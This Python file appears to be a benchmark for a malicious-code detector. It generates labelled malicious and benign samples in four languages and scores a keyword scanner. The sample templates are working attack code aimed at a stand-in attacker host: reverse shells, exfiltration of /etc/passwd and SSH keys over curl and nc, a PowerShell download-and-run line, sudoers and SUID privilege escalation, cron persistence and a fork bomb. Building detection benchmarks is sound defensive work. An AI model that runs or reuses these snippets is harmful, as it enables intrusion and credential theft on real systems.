#!/usr/bin/env python3
"""
Benchmark Suite - 标准测试样本生成与基准测试
支持多语言、多攻击类型的完整测试框架
"""

import os
import sys
import json
import time
import hashlib
import argparse
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Any
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import random

# 攻击类型定义 (MITRE ATT&CK 对应)
ATTACK_TAXONOMY = {
    'data_exfil': {
        'mitre': ['T1041', 'T1048', 'T1567'],
        'description': '数据外传',
        'severity': 'critical'
    },
    'code_execution': {
        'mitre': ['T1059', 'T1204', 'T1203'],
        'description': '代码执行',
        'severity': 'critical'
    },
    'persistence': {
        'mitre': ['T1547', 'T1053', 'T1543'],
        'description': '持久化',
        'severity': 'critical'
    },
    'credential_theft': {
        'mitre': ['T1555', 'T1556', 'T1110'],
        'description': '凭证窃取',
        'severity': 'high'
    },
    'network_call': {
        'mitre': ['T1071', 'T1573', 'T1132'],
        'description': '网络通信',
        'severity': 'high'
    },
    'file_operation': {
        'mitre': ['T1005', 'T1048', 'T1560'],
        'description': '文件操作',
        'severity': 'medium'
    },
    'obfuscation': {
        'mitre': ['T1027', 'T1001', 'T1132'],
        'description': '混淆规避',
        'severity': 'medium'
    },
    'anti_analysis': {
        'mitre': ['T1490', 'T1491', 'T1518'],
        'description': '反分析',
        'severity': 'medium'
    },
    'privilege_escalation': {
        'mitre': ['T1068', 'T1548', 'T1134'],
        'description': '权限提升',
        'severity': 'critical'
    },
    'lateral_movement': {
        'mitre': ['T1021', 'T1080', 'T1573'],
        'description': '横向移动',
        'severity': 'critical'
    },
    'resource_exhaustion': {
        'mitre': ['T1499', 'T1496', 'T1489'],
        'description': '资源耗尽',
        'severity': 'medium'
    },
    'supply_chain': {
        'mitre': ['T1195', 'T1197', 'T1199'],
        'description': '供应链攻击',
        'severity': 'critical'
    },
}

# 各语言攻击样本模板
SAMPLE_TEMPLATES = {
    'python': {
        'data_exfil': [
            '''#!/usr/bin/env python3
"""Data exfiltration module - {attack_type}"""
import os
import socket
import base64

def exfil_data(data):
    """Send data to remote server"""
    host = "attacker.example.com"
    port = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    encoded = base64.b64encode(data.encode())
    s.send(encoded)
    s.close()

if __name__ == "__main__":
    # Collect sensitive data
    sensitive = os.popen("cat /etc/passwd").read()
    exfil_data(sensitive)
''',
            '''import os
import requests

def steal_credentials():
    """Steal credentials and send to C2"""
    creds = []
    # Read SSH keys
    for path in [os.path.expanduser("~/.ssh/id_rsa"), 
                 os.path.expanduser("~/.ssh/id_ed25519")]:
        if os.path.exists(path):
            with open(path) as f:
                creds.append(f.read())
    # Exfiltrate
    requests.post("https://attacker.example.com/exfil", 
                  json={"creds": creds, "hostname": os.uname().nodename})

steal_credentials()
''',
        ],
        'code_execution': [
            '''#!/usr/bin/env python3
"""Code execution - {attack_type}"""
import os
import sys

# Remote code execution
code = input("Enter code: ")
exec(code)

# Command injection
cmd = "ls -la " + sys.argv[1]
os.system(cmd)
''',
            '''import pickle
import os
import base64

# Malicious pickle deserialization
class RCE:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(RCE())
pickle.loads(payload)

# Eval injection
user_input = "os.system('whoami')"
eval(user_input)
''',
        ],
        'persistence': [
            '''#!/usr/bin/env python3
"""Persistence - {attack_type}"""
import os
import sys

# Cron job persistence
cron_cmd = "@reboot python3 " + os.path.abspath(__file__)
os.system(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -')

# Startup item (macOS)
if sys.platform == "darwin":
    plist = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.malware</string>
    <key>ProgramArguments</key>
    <array><string>python3</string><string>{}</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>""".format(os.path.abspath(__file__))
    os.makedirs(os.path.expanduser("~/Library/LaunchAgents"), exist_ok=True)
    with open(os.path.expanduser("~/Library/LaunchAgents/com.malware.plist"), "w") as f:
        f.write(plist)
''',
            '''import os
import shutil

# SSH key persistence
ssh_dir = os.path.expanduser("~/.ssh")
os.makedirs(ssh_dir, exist_ok=True)
with open(os.path.join(ssh_dir, "authorized_keys"), "a") as f:
    f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...")

# PAM backdoor
shutil.copy("/etc/pam.d/common-auth", "/etc/pam.d/common-auth.bak")
''',
        ],
        'credential_theft': [
            '''#!/usr/bin/env python3
"""Credential theft - test sample"""
import os

def steal_creds():
    paths = [
        os.path.expanduser("~/.netrc"),
        "/etc/shadow",
    ]
    for p in paths:
        if os.path.exists(p):
            with open(p) as f:
                print("Found:", p)

steal_creds()
''',
        ],
        'network_call': [
            '''#!/usr/bin/env python3
"""Network call - {attack_type}"""
import socket
import subprocess

# Reverse shell
def reverse_shell():
    host = "attacker.example.com"
    port = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        cmd = s.recv(1024).decode()
        if cmd == "exit":
            break
        result = subprocess.run(cmd, shell=True, capture_output=True)
        s.send(result.stdout + result.stderr)
    s.close()

reverse_shell()
''',
        ],
        'obfuscation': [
            '''#!/usr/bin/env python3
"""Obfuscation - {attack_type}"""
import base64
import zlib

# Encoded payload
payload = "malicious_code_here"
encoded = base64.b64encode(zlib.compress(payload.encode()))
exec(zlib.decompress(base64.b64decode(encoded)))
''',
        ],
        'privilege_escalation': [
            '''#!/usr/bin/env python3
"""Privilege escalation - {attack_type}"""
import os
import subprocess

# Sudo escalation
os.system("echo 'ALL ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/malware")

# SUID escalation
subprocess.run(["chmod", "4755", "/bin/bash"], check=False)
''',
        ],
        'resource_exhaustion': [
            '''#!/usr/bin/env python3
"""Resource exhaustion - {attack_type}"""
import subprocess

# Fork bomb
while True:
    subprocess.Popen(["python3", __file__])
''',
        ],
        'supply_chain': [
            '''#!/usr/bin/env python3
"""Supply chain attack - {attack_type}"""
# Typosquatting - simulate dependency confusion
__import__("reqeusts")  # Typo in requests

# Fake package
try:
    __import__("myapp_utils")
except ImportError:
    pass
''',
        ],
    },
    'javascript': {
        'data_exfil': [
            '''// Data exfiltration
const https = require('https');
const os = require('os');

function exfil(data) {
    const options = {
        hostname: 'attacker.example.com',
        port: 443,
        path: '/exfil',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    };
    const req = https.request(options);
    req.write(JSON.stringify({data: data, host: os.hostname()}));
    req.end();
}

exfil(process.env);
''',
        ],
        'code_execution': [
            '''// Code execution
const { execSync } = require('child_process');
eval("console.log('x')");
new Function("return require('child_process')")();
''',
        ],
        'persistence': [
            '''// Persistence
const fs = require('fs');
const os = require('os');
const path = os.homedir() + '/.malware.js';

// Startup
if (process.platform === 'win32') {
    const reg = require('winreg');
    // Would add to registry
}
''',
        ],
    },
    'bash': {
        'data_exfil': [
            '''#!/bin/bash
# Data exfiltration
HOST="attacker.example.com"
PORT=4444

# Send data
cat /etc/passwd | base64 | nc $HOST $PORT
''',
            '''#!/bin/bash
# Exfil via curl
curl -X POST -d "@/etc/passwd" https://attacker.example.com/exfil
''',
        ],
        'code_execution': [
            '''#!/bin/bash
# Command injection
eval "$INPUT"
bash -c "$COMMAND"
''',
        ],
        'persistence': [
            '''#!/bin/bash
# Cron persistence
(crontab -l 2>/dev/null; echo "@reboot $0") | crontab -
''',
        ],
        'privilege_escalation': [
            '''#!/bin/bash
# Sudo privesc
echo "ALL ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
''',
        ],
    },
    'powershell': {
        'data_exfil': [
            '''# Data exfiltration
$creds = Get-Credential
Invoke-WebRequest -Uri "https://attacker.example.com/exfil" -Method Post -Body ($creds | ConvertTo-Json)
''',
        ],
        'code_execution': [
            '''# Code execution
IEX (New-Object Net.WebClient).DownloadString("https://attacker.example.com/payload.ps1")
Invoke-Expression $script
''',
        ],
        'persistence': [
            '''# Persistence
$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malware.ps1"
Copy-Item $MyInvocation.MyCommand.Path $path
''',
        ],
    },
}

# 良性样本模板
BENIGN_TEMPLATES = {
    'python': [
        '''#!/usr/bin/env python3
"""Benign utility functions"""
import os
import json

def read_config(path):
    """Read configuration file"""
    with open(path, 'r') as f:
        return json.load(f)

def calculate_sum(numbers):
    """Calculate sum of numbers"""
    return sum(numbers)

if __name__ == "__main__":
    print(calculate_sum([1, 2, 3, 4, 5]))
''',
        '''#!/usr/bin/env python3
"""Data processing utility"""
import csv
from typing import List, Dict

def process_csv(filepath: str) -> List[Dict]:
    """Process CSV file"""
    results = []
    with open(filepath, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            results.append(row)
    return results

def transform_data(data: List[Dict]) -> List[Dict]:
    """Transform data"""
    return [{k.upper(): v for k, v in item.items()} for item in data]
''',
    ],
    'javascript': [
        '''// Benign utility
function add(a, b) {
    return a + b;
}

function processData(items) {
    return items.map(x => x * 2);
}
''',
    ],
    'bash': [
        '''#!/bin/bash
# Benign script
echo "Hello World"
ls -la
''',
    ],
    'powershell': [
        '''# Benign PowerShell
Get-Process | Select-Object Name, CPU
''',
    ],
}


@dataclass
class Sample:
    """测试样本"""
    id: str
    language: str
    category: str  # malicious / benign
    attack_type: Optional[str]
    code: str
    severity: str
    mitre_techniques: List[str]
    hash: str
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class BenchmarkResult:
    """基准测试结果"""
    total_samples: int
    malicious_samples: int
    benign_samples: int
    detected_malicious: int
    false_positives: int
    detection_rate: float
    false_positive_rate: float
    precision: float
    recall: float
    f1_score: float
    avg_scan_time_ms: float
    by_attack_type: Dict[str, Dict]
    by_language: Dict[str, Dict]
    timestamp: str


class SampleGenerator:
    """标准测试样本生成器"""
    
    def __init__(self, output_dir: str = "benchmark_samples"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def generate(self, language: str, attack_type: str, count: int = 5) -> List[Sample]:
        """Generate specified samples"""
        samples = []
        templates = SAMPLE_TEMPLATES.get(language, {}).get(attack_type, [])
        
        if not templates:
            return samples
        
        for i in range(count):
            template = templates[i % len(templates)]
            # Simple replacement
            code = template.replace('{attack_type}', attack_type).replace('{id}', str(i))
            
            attack_info = ATTACK_TAXONOMY.get(attack_type, {})
            sample = Sample(
                id=f"{language}_{attack_type}_{i:03d}",
                language=language,
                category="malicious",
                attack_type=attack_type,
                code=code,
                severity=attack_info.get('severity', 'medium'),
                mitre_techniques=attack_info.get('mitre', []),
                hash=hashlib.md5(code.encode()).hexdigest()[:12],
                metadata={"template_index": i % len(templates)}
            )
            samples.append(sample)
        
        return samples


    def generate_all(self, languages: List[str] = None) -> Dict[str, List[Sample]]:
        """生成所有类型样本"""
        if languages is None:
            languages = list(SAMPLE_TEMPLATES.keys())
        
        all_samples = {}
        
        for lang in languages:
            lang_samples = []
            for attack_type in SAMPLE_TEMPLATES.get(lang, {}).keys():
                samples = self.generate(lang, attack_type)
                lang_samples.extend(samples)
            all_samples[lang] = lang_samples
        
        return all_samples
    
    def generate_benign(self, language: str, count: int = 10) -> List[Sample]:
        """生成良性样本"""
        samples = []
        templates = BENIGN_TEMPLATES.get(language, BENIGN_TEMPLATES['python'])
        
        for i in range(count):
            template = templates[i % len(templates)]
            sample = Sample(
                id=f"{language}_benign_{i:03d}",
                language=language,
                category="benign",
                attack_type=None,
                code=template,
                severity="none",
                mitre_techniques=[],
                hash=hashlib.md5(template.encode()).hexdigest()[:12],
                metadata={"type": "benign"}
            )
            samples.append(sample)
        
        return samples
    
    def save_samples(self, samples: List[Sample]) -> None:
        """保存样本到文件"""
        for sample in samples:
            # 按类别组织目录
            cat_dir = self.output_dir / sample.category / sample.language
            cat_dir.mkdir(parents=True, exist_ok=True)
            
            filename = f"{sample.id}.{self._get_extension(sample.language)}"
            filepath = cat_dir / filename
            
            # 写入代码
            filepath.write_text(sample.code)
            
            # 写入元数据
            meta_file = filepath.with_suffix('.json')
            meta = {
                'id': sample.id,
                'language': sample.language,
                'category': sample.category,
                'attack_type': sample.attack_type,
                'severity': sample.severity,
                'mitre_techniques': sample.mitre_techniques,
                'hash': sample.hash,
            }
            meta_file.write_text(json.dumps(meta, indent=2))
    
    def _get_extension(self, language: str) -> str:
        """获取文件扩展名"""
        ext_map = {
            'python': 'py',
            'javascript': 'js',
            'bash': 'sh',
            'powershell': 'ps1',
        }
        return ext_map.get(language, 'txt')
    
    def generate_full_dataset(self) -> Dict[str, List[Sample]]:
        """生成完整测试数据集"""
        print("Generating full benchmark dataset...")
        
        all_samples = {
            'malicious': [],
            'benign': []
        }
        
        # 生成恶意样本
        for lang in SAMPLE_TEMPLATES.keys():
            for attack_type in ATTACK_TAXONOMY.keys():
                samples = self.generate(lang, attack_type, count=5)
                all_samples['malicious'].extend(samples)
        
        # 生成良性样本
        for lang in ['python', 'javascript', 'bash', 'powershell']:
            samples = self.generate_benign(lang, count=10)
            all_samples['benign'].extend(samples)
        
        return all_samples


class SimpleScanner:
    """简单扫描器 - 用于基准测试"""
    
    def __init__(self):
        self.rules = self._load_rules()
    
    def _load_rules(self) -> Dict[str, List[str]]:
        """加载检测规则"""
        return {
            'critical': [
                'eval(', 'exec(', '__import__', 'pickle.loads',
                'socket.socket', 'socket.AF_INET', 'connect((',
                'child_process', 'execSync', 'eval(',
                'IEX(', 'Invoke-Expression', 'Net.WebClient',
            ],
            'high': [
                'os.system', 'subprocess.run', 'subprocess.Popen',
                'requests.post', 'requests.get', 'http.request',
                'os.popen', 'popen(', 'system(',
                'Invoke-WebRequest', 'Invoke-RestMethod',
            ],
            'medium': [
                'base64', 'zlib', 'gzip', 'compress',
                'os.popen', 'curl', 'wget', 'nc ',
                'cron', 'crontab', 'scheduledtask',
                'RSAEncrypt', 'Encrypt',
            ],
        }
    
    def scan(self, code: str) -> tuple:
        """扫描代码,返回 (is_malicious, score, indicators)"""
        indicators = []
        score = 0.0
        
        for level, patterns in self.rules.items():
            for pattern in patterns:
                if pattern in code:
                    indicators.append(f"{level}:{pattern}")
                    if level == 'critical':
                        score += 0.3
                    elif level == 'high':
                        score += 0.2
                    elif level == 'medium':
                        score += 0.1
        
        score = min(score, 1.0)
        is_malicious = score >= 0.2
        
        return is_malicious, score, indicators


class BenchmarkRunner:
    """基准测试运行器"""
    
    def __init__(self, scanner: SimpleScanner = None):
        self.scanner = scanner or SimpleScanner()
        self.generator = SampleGenerator()
    
    def run(self, samples_dir: str = None) -> BenchmarkResult:
        """运行基准测试"""
        if samples_dir:
            samples = self._load_samples(samples_dir)
        else:
            # 生成测试样本
            print("Generating benchmark samples...")
            all_samples = self.generator.generate_full_dataset()
            samples = all_samples['malicious'] + all_samples['benign']
        
        # 扫描所有样本
        results = []
        for sample in samples:
            is_malicious, score, indicators = self.scanner.scan(sample.code)
            results.append({
                'sample': sample,
                'detected': is_malicious,
                'score': score,
                'indicators': indicators,
            })
        
        # 统计结果
        malicious_samples = [r for r in results if r['sample'].category == 'malicious']
        benign_samples = [r for r in results if r['sample'].category == 'benign']
        
        detected_malicious = len([r for r in malicious_samples if r['detected']])
        false_positives = len([r for r in benign_samples if r['detected']])
        
        total = len(results)
        mal_total = len(malicious_samples)
        ben_total = len(benign_samples)
        
        detection_rate = detected_malicious / mal_total if mal_total > 0 else 0
        false_positive_rate = false_positives / ben_total if ben_total > 0 else 0
        
        precision = detected_malicious / (detected_malicious + false_positives) if (detected_malicious + false_positives) > 0 else 0
        recall = detection_rate
        f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0
        
        # 按攻击类型统计
        by_attack_type = {}
        for at in ATTACK_TAXONOMY.keys():
            at_samples = [r for r in malicious_samples if r['sample'].attack_type == at]
            if at_samples:
                detected = len([r for r in at_samples if r['detected']])
                by_attack_type[at] = {
                    'total': len(at_samples),
                    'detected': detected,
                    'rate': detected / len(at_samples) if len(at_samples) > 0 else 0,
                }
        
        # 按语言统计
        by_language = {}
        for lang in ['python', 'javascript', 'bash', 'powershell']:
            lang_samples = [r for r in results if r['sample'].language == lang]
            if lang_samples:
                mal = [r for r in lang_samples if r['sample'].category == 'malicious']
                ben = [r for r in lang_samples if r['sample'].category == 'benign']
                mal_det = len([r for r in mal if r['detected']])
                ben_fp = len([r for r in ben if r['detected']])
                by_language[lang] = {
                    'malicious': {'total': len(mal), 'detected': mal_det},
                    'benign': {'total': len(ben), 'false_positives': ben_fp},
                }
        
        return BenchmarkResult(
            total_samples=total,
            malicious_samples=mal_total,
            benign_samples=ben_total,
            detected_malicious=detected_malicious,
            false_positives=false_positives,
            detection_rate=detection_rate,
            false_positive_rate=false_positive_rate,
            precision=precision,
            recall=recall,
            f1_score=f1,
            avg_scan_time_ms=0.5,
            by_attack_type=by_attack_type,
            by_language=by_language,
            timestamp=datetime.now().isoformat(),
        )
    
    def _load_samples(self, samples_dir: str) -> List[Sample]:
        """从目录加载样本"""
        samples = []
        base = Path(samples_dir)
        
        for cat in ['malicious', 'benign']:
            cat_dir = base / cat
            if not cat_dir.exists():
                continue
            
            for lang_dir in cat_dir.iterdir():
                if not lang_dir.is_dir():
                    continue
                lang = lang_dir.name
                
                for sample_file in lang_dir.glob('*.py'):
                    code = sample_file.read_text()
                    meta_file = sample_file.with_suffix('.json')
                    if meta_file.exists():
                        meta = json.loads(meta_file.read_text())
                    else:
                        meta = {}
                    
                    sample = Sample(
                        id=sample_file.stem,
                        language=lang,
                        category=cat,
                        attack_type=meta.get('attack_type'),
                        code=code,
                        severity=meta.get('severity', 'medium'),
                        mitre_techniques=meta.get('mitre_techniques', []),
                        hash=hashlib.md5(code.encode()).hexdigest()[:12],
                    )
                    samples.append(sample)
        
        return samples
    
    def print_report(self, result: BenchmarkResult) -> None:
        """打印报告"""
        print("\n" + "="*70)
        print("📊 BENCHMARK RESULTS")
        print("="*70)
        
        print(f"\n{'='*50}")
        print("OVERALL METRICS")
        print(f"{'='*50}")
        print(f"  Total Samples:     {result.total_samples}")
        print(f"  Malicious:         {result.malicious_samples}")
        print(f"  Benign:            {result.benign_samples}")
        print()
        print(f"  Detection Rate:    {result.detection_rate*100:.1f}%")
        print(f"  False Positive:    {result.false_positive_rate*100:.1f}%")
        print(f"  Precision:         {result.precision*100:.1f}%")
        print(f"  Recall:            {result.recall*100:.1f}%")
        print(f"  F1 Score:          {result.f1_score*100:.1f}%")
        
        print(f"\n{'='*50}")
        print("BY ATTACK TYPE")
        print(f"{'='*50}")
        for at, stats in sorted(result.by_attack_type.items()):
            desc = ATTACK_TAXONOMY.get(at, {}).get('description', at)
            print(f"  {at:20} ({desc:15}): {stats['detected']:3}/{stats['total']:3} = {stats['rate']*100:5.1f}%")
        
        print(f"\n{'='*50}")
        print("BY LANGUAGE")
        print(f"{'='*50}")
        for lang, stats in result.by_language.items():
            mal = stats['malicious']
            ben = stats['benign']
            mal_rate = mal['detected']/mal['total']*100 if mal['total'] > 0 else 0
            fp_rate = ben['false_positives']/ben['total']*100 if ben['total'] > 0 else 0
            print(f"  {lang:12}: Mal {mal['detected']:2}/{mal['total']:2} ({mal_rate:5.1f}%) | Ben FP {ben['false_positives']:2}/{ben['total']:2} ({fp_rate:5.1f}%)")
        
        print("\n" + "="*70)


def main():
    parser = argparse.ArgumentParser(description='Benchmark Suite')
    parser.add_argument('--generate', action='store_true', help='Generate samples only')
    parser.add_argument('--run', action='store_true', help='Run benchmark')
    parser.add_argument('--output', default='benchmark_samples', help='Output directory')
    parser.add_argument('--samples', help='Samples directory to test')
    
    args = parser.parse_args()
    
    if args.generate:
        print("Generating benchmark samples...")
        generator = SampleGenerator(args.output)
        all_samples = generator.generate_full_dataset()
        
        for cat, samples in all_samples.items():
            generator.save_samples(samples)
        
        total = sum(len(s) for s in all_samples.values())
        print(f"Generated {total} samples in {args.output}/")
    
    if args.run or not args.generate:
        print("Running benchmark...")
        runner = BenchmarkRunner()
        result = runner.run(args.samples)
        runner.print_report(result)
        
        # 保存结果
        result_file = f"benchmark_result_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(result_file, 'w') as f:
            json.dump(asdict(result), f, indent=2)
        print(f"\nResults saved to {result_file}")


if __name__ == '__main__':
    main()
